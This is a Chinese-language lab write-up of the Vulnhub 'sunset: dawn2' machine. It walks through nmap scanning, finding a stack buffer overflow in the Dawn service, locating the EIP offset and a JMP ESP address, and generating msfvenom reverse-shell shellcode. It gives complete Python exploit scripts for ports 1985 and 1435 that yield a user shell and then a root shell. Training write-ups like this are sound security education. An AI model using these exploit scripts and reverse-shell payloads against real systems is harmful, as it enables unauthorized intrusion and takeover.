---
title: Vulnhub-sunset dawn2
published: 2025-03-09
tags: [Vulnhub]
category: 靶机
draft: false
---

# sunset: dawn2

> https://www.vulnhub.com/entry/sunset-dawn2,424/
> 

kali IP 为 `192.168.56.10` ， `192.168.111.159`

测试虚拟机win10 ip为 `192.168.111.154`

目标主机ip为`192.168.56.9`

## 主机发现端口扫描

1. 探测存活主机，`9`是靶机
    
    ```php
    nmap -sP 192.168.56.0/24
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-17 22:11 CST
    Nmap scan report for 192.168.56.1
    Host is up (0.00036s latency).
    MAC Address: 0A:00:27:00:00:15 (Unknown)
    Nmap scan report for 192.168.56.2
    Host is up (0.00030s latency).
    MAC Address: 08:00:27:55:BE:BB (Oracle VirtualBox virtual NIC)
    Nmap scan report for 192.168.56.9
    Host is up (0.00055s latency).
    MAC Address: 08:00:27:09:74:31 (Oracle VirtualBox virtual NIC)
    Nmap scan report for 192.168.56.128
    Host is up.
    ```
    
2. 扫描靶机所有开放端口
    
    ```php
    nmap -sT -min-rate 10000 -p- 192.168.56.9
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-17 22:12 CST
    Nmap scan report for 192.168.56.9
    Host is up (0.00052s latency).
    Not shown: 65532 closed tcp ports (conn-refused)
    PORT     STATE SERVICE
    80/tcp   open  http
    1435/tcp open  ibm-cics
    1985/tcp open  hsrp
    MAC Address: 08:00:27:09:74:31 (Oracle VirtualBox virtual NIC)
    ```
    
3. 扫描服务版本及系统版本
    
    ```php
    nmap -sV -sT -O -p 80,1435,1985 192.168.56.9
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-17 22:13 CST
    Nmap scan report for 192.168.56.9
    Host is up (0.00051s latency).
    
    PORT     STATE SERVICE    VERSION
    80/tcp   open  http       Apache httpd 2.4.38 ((Debian))
    1435/tcp open  tcpwrapped
    1985/tcp open  tcpwrapped
    MAC Address: 08:00:27:09:74:31 (Oracle VirtualBox virtual NIC)
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose
    Running: Linux 4.X|5.X
    OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
    OS details: Linux 4.15 - 5.8
    Network Distance: 1 hop
    ```
    
4. 扫描漏洞
    
    ```c
    nmap -script=vuln -p 80,1435,1985 192.168.56.9
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-17 22:14 CST
    Nmap scan report for 192.168.56.9
    Host is up (0.00077s latency).
    
    PORT     STATE SERVICE
    80/tcp   open  http
    |_http-csrf: Couldn't find any CSRF vulnerabilities.
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    |_http-dombased-xss: Couldn't find any DOM based XSS.
    1435/tcp open  ibm-cics
    1985/tcp open  hsrp
    MAC Address: 08:00:27:09:74:31 (Oracle VirtualBox virtual NIC)
    ```
    
    发现没扫出什么有用的信息，尝试一下`UDP`扫描
    
5. 扫描`UDP`端口，但是没扫出来

## 寻找突破口

1. 没什么思路，先到`80`端口看看
    
    ![image.png](image%20110.png)
    
    提示网站正在建设中，请稍后再试，下边是详细信息
    
    ```c
    网站目前正在建设中，请稍后再试。
    
    如果您在使用公司提供的设备时遇到任何不便，请尽快联系 IT 支持，但是，如果您与“不存在的公司和合伙人”（NECA）没有任何关联，请立即离开此网站。
    新闻：
    
    由于该组织遭受了最后一次入侵，但尚未对此类破坏企图作出解释；NECA 已经找到解决方案，即关闭所有服务并将它们合并在一起，从而创建“Dawn”服务器。可以从此处下载。客户端目前正在开发中。
    摄像头源已成功安装。
    个人资料已更新。
    
    我们需要实施的事情：
    
    IDS 和 WAF 软件。
    一个全新的蓝队，能够检测和驱逐恶意行为者。
    ```
    
2. 看得到页面上存在一个超链接，点击后下载了`dawn.zip`的压缩包，解压得到
    
    ![image.png](image%20111.png)
    
3. 首先看`README`里边的内容
    
    ```c
    DAWN Multi Server - Version 1.1
    
    Important:
    
    Due the lack of implementation of the Dawn client, many issues may be experienced, such as the message not being delivered. In order to make sure the connection is finished and the message well received, send a NULL-byte at the ending of your message. 
    Also, the service may crash after several requests.
    
    Sorry for the inconvenience!
    ```
    
    ```c
    DAWN 多服务器 - 版本 1.1
    
    重要提示：
    
    由于 Dawn 客户端的实现不足，可能会遇到许多问题，例如无法传递消息。为了确保连接完成并且消息被正确接收，请在消息末尾发送一个 NULL 字节。
    此外，服务可能会在多次请求后崩溃。
    
    很抱歉给您带来不便！
    ```
    
    一看内容解释就感觉是缓冲区溢出漏洞（雾）
    
4. 我们使用虚拟机(测试虚拟机ip为`192.168.111.154` ，同时kali的ip为`192.168.111.159`)打开该应用
    
    ![image.png](image%20112.png)
    
5. 查看当前端口
    
    可以发现增加了一个和靶机一模一样的端口，由此判断靶机上也是该服务
    
    ![image.png](image%20113.png)
    

## 测试是否存在缓冲区溢出漏洞

1. 在windows虚拟机里边测试，打开`immunity debuger` 然后运行`dawn.exe`
2. 编写测试文件，记得README里边说过要在最后加上`null`字节
    
    ```c
    cat buffer.py  
    import socket
    
    a = 'A' * 500 + '\x00'
    s = socket.socket()
    s.connect(('192.168.111.154',1985))
    s.send(a.encode('utf-8'))
    s.close()
    ```
    
    假如存在缓冲区溢出漏洞那么应该`ESP`会被`A`字节覆盖
    
3. 运行文件，然后查看`immunity debuger` 
    
    ![image.png](image%20114.png)
    
    可以看到`ESP` 和`EIP`已经被覆盖掉了，所以存在缓冲区溢出漏洞
    

## 定位EIP

1. 存在缓冲区溢出漏洞，那我们就要定为`EIP` 
2. 使用`gdb`生成`500`个唯一字符
    
    ```c
    gdb-peda$ pattern create 500
    'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A'
    ```
    
3. 修改测试文件
    
    ```c
    cat buffer.py 
    import socket
    
    a = 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A' + '\x00'
    s = socket.socket()
    s.connect(('192.168.111.154',1985))
    s.send(a.encode('utf-8'))
    s.close()
    ```
    
4. 和上边一样测试
    
    ![image.png](image%20115.png)
    
    得到为唯一字符`25414925` 是`ASCII`码，但是因为是小端显示，所以要将字符反转`25494125`，得`%IA%`
    
    然后`gds`定位字符，那么就是说到`EIP`之前要填充`272`个字符，然后再增加四个字符就能覆盖`EIP`
    
    ```c
    gdb-peda$ pattern offset %IA%
    %IA% found at offset: 272
    ```
    
5. 测试是否能正确覆盖`EIP`
    
    ```c
    cat buffer.py
    import socket
    
    a = 'A' * 272 + 'B' * 4 + '\x00'
    s = socket.socket()
    s.connect(('192.168.111.154',1985))
    s.send(a.encode('utf-8'))
    s.close()
    ```
    
    ![image.png](image%20116.png)
    
    可以看到填充成功
    

## 定位jmp esp

输入`shellcode`可以放在`ESP`中，但是怎么保证能正常走到`ESP`，所以我们要找到`JMP ESP`的内存地址，将它覆盖到`EIP`处即可

`JMP ESP`的操作码是`FFE4`

1. 如何定位`jmp esp` ，需要用到`python`脚本`mona` 在`github`上可以找到
2. 定位`JMP ESP` ，没找到
    
    ![image.png](image%20117.png)
    
    但是有其他替换的指令
    
    ```c
    !mona find -s "\xff\xe4" -m "dawn.exe" #jmp esp
    !mona find -s "\x54\xc3" -m "dawn.exe" #PUSH ESP; RET
    !mona find -s "\xff\xd4" -m "dawn.exe" #CALL ESP
    ```
    
    ![image.png](image%20118.png)
    
    获得地址`34581777` ，因为小端显示的原因要逆转，那么就是`\x77\x17\x58\x34`
    

## 插入shellcode

1. 使用`msfvenom`生成`shellcode`
    
    ```c
    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.111.159 LPORT=1234 -b "\x00" -f python
    Found 11 compatible encoders
    Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
    x86/shikata_ga_nai succeeded with size 351 (iteration=0)
    x86/shikata_ga_nai chosen with final size 351
    Payload size: 351 bytes
    Final size of python file: 1745 bytes
    buf =  b""
    buf += b"\xbb\x49\x78\x0e\x0a\xdb\xda\xd9\x74\x24\xf4\x5e"
    buf += b"\x33\xc9\xb1\x52\x31\x5e\x12\x83\xee\xfc\x03\x17"
    buf += b"\x76\xec\xff\x5b\x6e\x72\xff\xa3\x6f\x13\x89\x46"
    buf += b"\x5e\x13\xed\x03\xf1\xa3\x65\x41\xfe\x48\x2b\x71"
    buf += b"\x75\x3c\xe4\x76\x3e\x8b\xd2\xb9\xbf\xa0\x27\xd8"
    buf += b"\x43\xbb\x7b\x3a\x7d\x74\x8e\x3b\xba\x69\x63\x69"
    buf += b"\x13\xe5\xd6\x9d\x10\xb3\xea\x16\x6a\x55\x6b\xcb"
    buf += b"\x3b\x54\x5a\x5a\x37\x0f\x7c\x5d\x94\x3b\x35\x45"
    buf += b"\xf9\x06\x8f\xfe\xc9\xfd\x0e\xd6\x03\xfd\xbd\x17"
    buf += b"\xac\x0c\xbf\x50\x0b\xef\xca\xa8\x6f\x92\xcc\x6f"
    buf += b"\x0d\x48\x58\x6b\xb5\x1b\xfa\x57\x47\xcf\x9d\x1c"
    buf += b"\x4b\xa4\xea\x7a\x48\x3b\x3e\xf1\x74\xb0\xc1\xd5"
    buf += b"\xfc\x82\xe5\xf1\xa5\x51\x87\xa0\x03\x37\xb8\xb2"
    buf += b"\xeb\xe8\x1c\xb9\x06\xfc\x2c\xe0\x4e\x31\x1d\x1a"
    buf += b"\x8f\x5d\x16\x69\xbd\xc2\x8c\xe5\x8d\x8b\x0a\xf2"
    buf += b"\xf2\xa1\xeb\x6c\x0d\x4a\x0c\xa5\xca\x1e\x5c\xdd"
    buf += b"\xfb\x1e\x37\x1d\x03\xcb\x98\x4d\xab\xa4\x58\x3d"
    buf += b"\x0b\x15\x31\x57\x84\x4a\x21\x58\x4e\xe3\xc8\xa3"
    buf += b"\x19\xcc\xa5\xc4\x46\xa4\xb7\x1a\x7d\xe7\x31\xfc"
    buf += b"\x17\x17\x14\x57\x80\x8e\x3d\x23\x31\x4e\xe8\x4e"
    buf += b"\x71\xc4\x1f\xaf\x3c\x2d\x55\xa3\xa9\xdd\x20\x99"
    buf += b"\x7c\xe1\x9e\xb5\xe3\x70\x45\x45\x6d\x69\xd2\x12"
    buf += b"\x3a\x5f\x2b\xf6\xd6\xc6\x85\xe4\x2a\x9e\xee\xac"
    buf += b"\xf0\x63\xf0\x2d\x74\xdf\xd6\x3d\x40\xe0\x52\x69"
    buf += b"\x1c\xb7\x0c\xc7\xda\x61\xff\xb1\xb4\xde\xa9\x55"
    buf += b"\x40\x2d\x6a\x23\x4d\x78\x1c\xcb\xfc\xd5\x59\xf4"
    buf += b"\x31\xb2\x6d\x8d\x2f\x22\x91\x44\xf4\x52\xd8\xc4"
    buf += b"\x5d\xfb\x85\x9d\xdf\x66\x36\x48\x23\x9f\xb5\x78"
    buf += b"\xdc\x64\xa5\x09\xd9\x21\x61\xe2\x93\x3a\x04\x04"
    buf += b"\x07\x3a\x0d"
    ```
    
2. 构造payload
    
    ```c
    import socket
    
    buf =  b""
    buf += b"\xbb\x49\x78\x0e\x0a\xdb\xda\xd9\x74\x24\xf4\x5e"
    buf += b"\x33\xc9\xb1\x52\x31\x5e\x12\x83\xee\xfc\x03\x17"
    buf += b"\x76\xec\xff\x5b\x6e\x72\xff\xa3\x6f\x13\x89\x46"
    buf += b"\x5e\x13\xed\x03\xf1\xa3\x65\x41\xfe\x48\x2b\x71"
    buf += b"\x75\x3c\xe4\x76\x3e\x8b\xd2\xb9\xbf\xa0\x27\xd8"
    buf += b"\x43\xbb\x7b\x3a\x7d\x74\x8e\x3b\xba\x69\x63\x69"
    buf += b"\x13\xe5\xd6\x9d\x10\xb3\xea\x16\x6a\x55\x6b\xcb"
    buf += b"\x3b\x54\x5a\x5a\x37\x0f\x7c\x5d\x94\x3b\x35\x45"
    buf += b"\xf9\x06\x8f\xfe\xc9\xfd\x0e\xd6\x03\xfd\xbd\x17"
    buf += b"\xac\x0c\xbf\x50\x0b\xef\xca\xa8\x6f\x92\xcc\x6f"
    buf += b"\x0d\x48\x58\x6b\xb5\x1b\xfa\x57\x47\xcf\x9d\x1c"
    buf += b"\x4b\xa4\xea\x7a\x48\x3b\x3e\xf1\x74\xb0\xc1\xd5"
    buf += b"\xfc\x82\xe5\xf1\xa5\x51\x87\xa0\x03\x37\xb8\xb2"
    buf += b"\xeb\xe8\x1c\xb9\x06\xfc\x2c\xe0\x4e\x31\x1d\x1a"
    buf += b"\x8f\x5d\x16\x69\xbd\xc2\x8c\xe5\x8d\x8b\x0a\xf2"
    buf += b"\xf2\xa1\xeb\x6c\x0d\x4a\x0c\xa5\xca\x1e\x5c\xdd"
    buf += b"\xfb\x1e\x37\x1d\x03\xcb\x98\x4d\xab\xa4\x58\x3d"
    buf += b"\x0b\x15\x31\x57\x84\x4a\x21\x58\x4e\xe3\xc8\xa3"
    buf += b"\x19\xcc\xa5\xc4\x46\xa4\xb7\x1a\x7d\xe7\x31\xfc"
    buf += b"\x17\x17\x14\x57\x80\x8e\x3d\x23\x31\x4e\xe8\x4e"
    buf += b"\x71\xc4\x1f\xaf\x3c\x2d\x55\xa3\xa9\xdd\x20\x99"
    buf += b"\x7c\xe1\x9e\xb5\xe3\x70\x45\x45\x6d\x69\xd2\x12"
    buf += b"\x3a\x5f\x2b\xf6\xd6\xc6\x85\xe4\x2a\x9e\xee\xac"
    buf += b"\xf0\x63\xf0\x2d\x74\xdf\xd6\x3d\x40\xe0\x52\x69"
    buf += b"\x1c\xb7\x0c\xc7\xda\x61\xff\xb1\xb4\xde\xa9\x55"
    buf += b"\x40\x2d\x6a\x23\x4d\x78\x1c\xcb\xfc\xd5\x59\xf4"
    buf += b"\x31\xb2\x6d\x8d\x2f\x22\x91\x44\xf4\x52\xd8\xc4"
    buf += b"\x5d\xfb\x85\x9d\xdf\x66\x36\x48\x23\x9f\xb5\x78"
    buf += b"\xdc\x64\xa5\x09\xd9\x21\x61\xe2\x93\x3a\x04\x04"
    buf += b"\x07\x3a\x0d"                           
                                                        
    a = b'A' * 272 + b'\x77\x17\x58\x34' * 4 + b'\x90' * 32 + buf                                               
    s = socket.socket()                                 
    s.connect(('192.168.111.154',1985))        
    s.send(a)
    s.close()
    ```
    
3. `msf`根据生成`payload`进行监听，运行`payload`文件，成功获得`shell`
    
    ```c
    msf6 exploit(multi/handler) > run
    
    [*] Started reverse TCP handler on 192.168.111.159:1234 
    [*] Command shell session 2 opened (192.168.111.159:1234 -> 192.168.111.154:63215) at 2024-12-18 15:47:13 +0800
    
    Shell Banner:
    Microsoft Windows [_ 10.0.18363.418]
    -----
              
    
    C:\Users\Administrator\Desktop>
    ```
    

## 利用缓冲区溢出漏洞

1. 刚刚在`windows`上测试成功，接下来要在目标主机上使用
2. 生成新的`shellcode`
    
    ```c
    msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.56.10 LPORT=1234 -b "\x00" -f python
    ```
    
3. 修改新的`payload`
    
    ```c
    import socket
    
    buf =  b""
    buf += b"\xbd\xd9\x9c\x86\x5c\xdb\xd7\xd9\x74\x24\xf4\x5e"
    buf += b"\x31\xc9\xb1\x12\x83\xc6\x04\x31\x6e\x0e\x03\xb7"
    buf += b"\x92\x64\xa9\x76\x70\x9f\xb1\x2b\xc5\x33\x5c\xc9"
    buf += b"\x40\x52\x10\xab\x9f\x15\xc2\x6a\x90\x29\x28\x0c"
    buf += b"\x99\x2c\x4b\x64\xda\x67\x93\x7e\xb2\x75\xe4\x7a"
    buf += b"\x90\xf3\x05\x32\x72\x54\x97\x61\xc8\x57\x9e\x64"
    buf += b"\xe3\xd8\xf2\x0e\x92\xf7\x81\xa6\x02\x27\x49\x54"
    buf += b"\xba\xbe\x76\xca\x6f\x48\x99\x5a\x84\x87\xda"                           
                                                        
    a = b'A' * 272 + b'\x77\x17\x58\x34' * 4 + b'\x90' * 32 + buf                                               
    s = socket.socket()                                 
    s.connect(('192.168.56.9',1985))        
    s.send(a)
    s.close()
    ```
    
4. `msf`根据`payload`进行监听，运行`python`文件
    
    ```c
    msf6 exploit(multi/handler) > run
    
    [*] Started reverse TCP handler on 192.168.56.10:1234 
    [*] Command shell session 3 opened (192.168.56.10:1234 -> 192.168.56.9:44106) at 2024-12-18 15:54:53 +0800
    ```
    
    成功获得`shell`
    

## 提权

1. 查看权限
    
    ```c
    $ whoami
    dawn-daemon
    $ id
    uid=1000(dawn-daemon) gid=1000(dawn-daemon) groups=1000(dawn-daemon),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),115(lpadmin),116(scanner)
    $ uname -a
    Linux dawn2 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64 GNU/Linux
    ```
    
2. 当前目录下存在`dawn-BETA.exe  dawn.exe  user.txt` ,`user.txt`是`flag`
    
    ```c
    ebcc766cc3d69da825efff32a5b1b304
    ```
    
    ```c
    ls -al
    drwxr-xr-x 4 dawn-daemon dawn-daemon   4096 Feb 14  2020 .
    drwxr-xr-x 3 root        root          4096 Feb 14  2020 ..
    -rw------- 1 dawn-daemon dawn-daemon      0 Feb 14  2020 .bash_history
    -rw-r--r-- 1 dawn-daemon dawn-daemon    220 Feb 14  2020 .bash_logout
    -rw-r--r-- 1 dawn-daemon dawn-daemon   3526 Feb 14  2020 .bashrc
    drwxr-xr-x 3 dawn-daemon dawn-daemon   4096 Feb 14  2020 .local
    -rw-r--r-- 1 dawn-daemon dawn-daemon    807 Feb 14  2020 .profile
    -rw-r--r-- 1 dawn-daemon dawn-daemon     66 Feb 14  2020 .selected_editor
    drwxr-xr-x 4 dawn-daemon dawn-daemon   4096 Dec 18 03:03 .wine
    -rw-r--r-- 1 root        root        292728 Feb 14  2020 dawn-BETA.exe
    -rw-r--r-- 1 dawn-daemon dawn-daemon 374784 Feb 14  2020 dawn.exe
    -rw------- 1 dawn-daemon dawn-daemon     33 Feb 14  2020 user.txt
    ```
    
    发现 `dawn-BETA.exe` 是`root`权限运行的，可能则就是突破口
    
3. 查看进程
    
    ![image.png](image%20119.png)
    
    想起来还开启着`1435`端口，可能就是`dawn-BETA`
    
4. 把文件传到测试机再试上边的操作（累），得到以下`payload`
    
    ```c
    import socket
    
    buf =  b""
    buf += b"\xbd\xd9\x9c\x86\x5c\xdb\xd7\xd9\x74\x24\xf4\x5e"
    buf += b"\x31\xc9\xb1\x12\x83\xc6\x04\x31\x6e\x0e\x03\xb7"
    buf += b"\x92\x64\xa9\x76\x70\x9f\xb1\x2b\xc5\x33\x5c\xc9"
    buf += b"\x40\x52\x10\xab\x9f\x15\xc2\x6a\x90\x29\x28\x0c"
    buf += b"\x99\x2c\x4b\x64\xda\x67\x93\x7e\xb2\x75\xe4\x7a"
    buf += b"\x90\xf3\x05\x32\x72\x54\x97\x61\xc8\x57\x9e\x64"
    buf += b"\xe3\xd8\xf2\x0e\x92\xf7\x81\xa6\x02\x27\x49\x54"
    buf += b"\xba\xbe\x76\xca\x6f\x48\x99\x5a\x84\x87\xda"                           
                                                        
    a = b'A' * 13 + b'\x77\x17\x58\x34' * 4 + b'\x90' * 32 + buf                                               
    s = socket.socket()                                 
    s.connect(('192.168.56.9',1435))        
    s.send(a)
    s.close()
    ```
    
    然后重复上边的操作就能获得`root`权限
    
5. 读取flag
    
    ```c
    cat proof.txt
                  ,.  _~-.,               .
               ~'`_ \/,_. \_
              / ,"_>@`,__`~.)             |           .
              | |  @@@@'  ",! .           .          '
              |/   ^^@     .!  \          |         /
              `' .^^^     ,'    '         |        .             .
               .^^^   .          \                /          .
              .^^^       '  .     \       |      /       . '
    .,.,.     ^^^             ` .   .,+~'`^`'~+,.     , '
    &&&&&&,  ,^^^^.  . ._ ..__ _  .'             '. '_ __ ____ __ _ .. .  .
    %%%%%%%%%^^^^^^%%&&;_,.-=~'`^`'~=-.,__,.-=~'`^`'~=-.,__,.-=~'`^`'~=-.,
    &&&&&%%%%%%%%%%%%%%%%%%&&;,.-=~'`^`'~=-.,__,.-=~'`^`'~=-.,__,.-=~'`^`'~=
    %%%%%&&&&&&&&&&&%%%%&&&_,.;^`'~=-.,__,.-=~'`^`'~=-.,__,.-=~'`^`'~=-.,__,
    %%%%%%%%%&&&&&&&&&-=~'`^`'~=-.,__,.-=~'`^`'~=-.,__,.-==--^'~=-.,__,.-=~'
    ##mjy#####*"'
    _,.-=~'`^`'~=-.,__,.-=~'`^`'~=-.,__,.-=~'`^`'~=-.,.-=~'`^`'~=-.,__,.-=~'
    
    ~`'^`'~=-.,__,.-=~'`^`'~=-.,__,.-=~'`^`'~=-.,__,.-=~'`^`'~=-.,__,.-=~'`^
    
    Thanks to @M_Ercolino for the original application. Original code:https://itandsecuritystuffs.wordpress.com/2014/03/26/understanding-buffer-overflow-attacks-part-2/
    
    Thanks for playing! - Felipe Winsnes (@whitecr0wz)
    
    cb484c37abf0ade3b36112335d81fa01
    ```